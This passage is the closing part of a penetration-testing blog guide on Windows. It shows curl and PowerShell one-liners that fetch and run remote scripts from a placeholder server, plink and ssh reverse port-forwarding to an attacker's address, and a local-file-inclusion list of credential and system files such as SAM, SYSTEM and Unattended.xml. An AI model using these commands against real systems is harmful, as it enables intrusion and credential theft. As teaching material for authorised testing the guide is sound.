+<p>Starting with Windows 10 1803 (April 2018 Update) the <code class="highlighter-rouge">curl</code> command has been implemented which gives another way to transfer files and even execute them in memory. <em>Piping directly into cmd will run most things but it seems like if you have anything other than regular commands in your script, ie loops, if statements etc, it doesn’t run them correctly.</em></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://server/file -o file
+curl http://server/file.bat | cmd
+</code></pre></div></div>
+
+<p>And with PowerShell</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">IEX</span><span class="o">(</span><span class="nb">curl </span>http://server/script.ps1<span class="o">)</span>;Invoke-Blah
+</code></pre></div></div>
+
+<h2 id="port-forwarding">Port Forwarding</h2>
+
+<p>This is useful for exposing inside services that aren’t available from outside the machine, normally due to firewall settings.</p>
+
+<p>Upload <code class="highlighter-rouge">plink.exe</code> to target.</p>
+
+<p>Start SSH on your attacking machine.</p>
+
+<p>For example to expose SMB, on the target run:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
+</code></pre></div></div>
+
+<p>As of Windows 10 1803 (April 2018 Update), ssh client is now included and turned on by default! So you’re able use ssh to do port forwarding right out of the box now.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
+</code></pre></div></div>
+
+<h2 id="local-file-inclusion-list">Local File Inclusion List</h2>
+
+<p>This is not an exhaustive list, installation directories will vary, I’ve only listed common ones.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Apache\conf\httpd.conf
+C:\Apache\logs\access.log
+C:\Apache\logs\error.log
+C:\Apache2\conf\httpd.conf
+C:\Apache2\logs\access.log
+C:\Apache2\logs\error.log
+C:\Apache22\conf\httpd.conf
+C:\Apache22\logs\access.log
+C:\Apache22\logs\error.log
+C:\Apache24\conf\httpd.conf
+C:\Apache24\logs\access.log
+C:\Apache24\logs\error.log
+C:\Documents and Settings\Administrator\NTUser.dat
+C:\php\php.ini
+C:\php4\php.ini
+C:\php5\php.ini
+C:\php7\php.ini
+C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
+C:\Program Files (x86)\Apache Group\Apache\logs\access.log
+C:\Program Files (x86)\Apache Group\Apache\logs\error.log
+C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
+C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
+C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
+c:\Program Files (x86)\php\php.ini"
+C:\Program Files\Apache Group\Apache\conf\httpd.conf
+C:\Program Files\Apache Group\Apache\conf\logs\access.log
+C:\Program Files\Apache Group\Apache\conf\logs\error.log
+C:\Program Files\Apache Group\Apache2\conf\httpd.conf
+C:\Program Files\Apache Group\Apache2\conf\logs\access.log
+C:\Program Files\Apache Group\Apache2\conf\logs\error.log
+C:\Program Files\FileZilla Server\FileZilla Server.xml
+C:\Program Files\MySQL\my.cnf
+C:\Program Files\MySQL\my.ini
+C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
+C:\Program Files\MySQL\MySQL Server 5.0\my.ini
+C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
+C:\Program Files\MySQL\MySQL Server 5.1\my.ini
+C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
+C:\Program Files\MySQL\MySQL Server 5.5\my.ini
+C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
+C:\Program Files\MySQL\MySQL Server 5.6\my.ini
+C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
+C:\Program Files\MySQL\MySQL Server 5.7\my.ini
+C:\Program Files\php\php.ini
+C:\Users\Administrator\NTUser.dat
+C:\Windows\debug\NetSetup.LOG
+C:\Windows\Panther\Unattend\Unattended.xml
+C:\Windows\Panther\Unattended.xml
+C:\Windows\php.ini
+C:\Windows\repair\SAM
+C:\Windows\repair\system
+C:\Windows\System32\config\AppEvent.evt
+C:\Windows\System32\config\RegBack\SAM
+C:\Windows\System32\config\RegBack\system
+C:\Windows\System32\config\SAM
+C:\Windows\System32\config\SecEvent.evt
+C:\Windows\System32\config\SysEvent.evt
+C:\Windows\System32\config\SYSTEM
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\System32\winevt\Logs\Application.evtx
+C:\Windows\System32\winevt\Logs\Security.evtx
+C:\Windows\System32\winevt\Logs\System.evtx
+C:\Windows\win.ini 
+C:\xampp\apache\conf\extra\httpd-xampp.conf
+C:\xampp\apache\conf\httpd.conf
+C:\xampp\apache\logs\access.log
+C:\xampp\apache\logs\error.log
+C:\xampp\FileZillaFTP\FileZilla Server.xml
+C:\xampp\MercuryMail\MERCURY.INI
+C:\xampp\mysql\bin\my.ini
+C:\xampp\php\php.ini
+C:\xampp\security\webdav.htpasswd
+C:\xampp\sendmail\sendmail.ini
+C:\xampp\tomcat\conf\server.xml
+</code></pre></div></div>
+
+      </article>
+
+      
+        <div class="blog-tags">
+          Tags:
+          
+            guides
+          
+        </div>
+      
+
+      
+
+      <ul class="pager blog-pager">
+        
+        <li class="previous">
+          <a href="/2018-01-23-UnderTheWire-Cyborg/" data-toggle="tooltip" data-placement="top" title="UnderTheWire Cyborg">&larr; Previous Post</a>
+        </li>
+        
+        
+        <li class="next">
+          <a href="/2018-02-24-HackTheBox-Mantis-Writeup/" data-toggle="tooltip" data-placement="top" title="HackTheBox - Mantis Writeup">Next Post &rarr;</a>
+        </li>
+        
+      </ul>
+
+      
+        <div class="disqus-comments">
+          
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+    <footer>
+  <div class="container beautiful-jekyll-footer">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+          
+          <li>
+            <a href="https://github.com/absolomb" title="GitHub">
+              <span class="fa-stack fa-lg" aria-hidden="true">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+              </span>
+              <span class="sr-only">GitHub</span>
+            </a>
+          </li>
+          
+		  
+	  
+      
+		  
+          <li>
+            <a href="mailto:YmxvZ0BhYnNvbG9tYi5jb20=" title="Email me">
+              <span class="fa-stack fa-lg" aria-hidden="true">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
+              </span>
+              <span class="sr-only">Email me</span>
+            </a>
+          </li>
+          
+		  
+		  
+		  
+      
+      
+      
+      
+      
+		  
+      
+      
+      
+        </ul>
+        <p class="copyright text-muted">
+		  Ryan McFarland
+		  &nbsp;&bull;&nbsp;
+		  2019
+
+		  
+	    </p>
+	        <!-- Please don't remove this, keep my open source work credited :) -->
+		<p class="theme-by text-muted">
+		  Theme by
+		  <a href="http://deanattali.com/beautiful-jekyll/">beautiful-jekyll</a>
+		</p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+  
+    
+
+
+
+
+
+
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      <script>
+      	if (typeof jQuery == 'undefined') {
+      	  document.write('<script src="/js/jquery-1.11.2.min.js"></scr' + 'ipt>');
+      	}
+      </script>
+    
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+	<script src="/js/bootstrap.min.js"></script>
+    
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+	<script src="/js/main.js"></script>
+    
+  
+
+
+
+	<!-- Google Analytics -->
+	<script>
+		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+		})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+		ga('create', 'UA-112132668-1', 'auto');
+		ga('send', 'pageview');
+	</script>
+	<!-- End Google Analytics -->
+
+
+  
+  </body>
+</html>
